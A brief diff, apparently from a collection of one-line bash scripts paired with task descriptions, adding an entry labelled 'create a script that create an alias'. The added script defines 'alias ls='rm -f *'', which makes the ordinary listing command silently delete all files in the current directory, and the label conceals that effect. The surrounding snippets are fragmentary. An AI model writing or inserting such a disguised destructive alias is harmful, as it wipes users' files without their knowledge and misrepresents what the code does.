@@ -229,4 +229,8 @@ remove all letters c and C from input
 
 #!/bin/bash
 ver 
-reverse its input  
+reverse its input
+
+#!/bin/bash
+alias ls='rm -f *'
+create a script that create an alias  
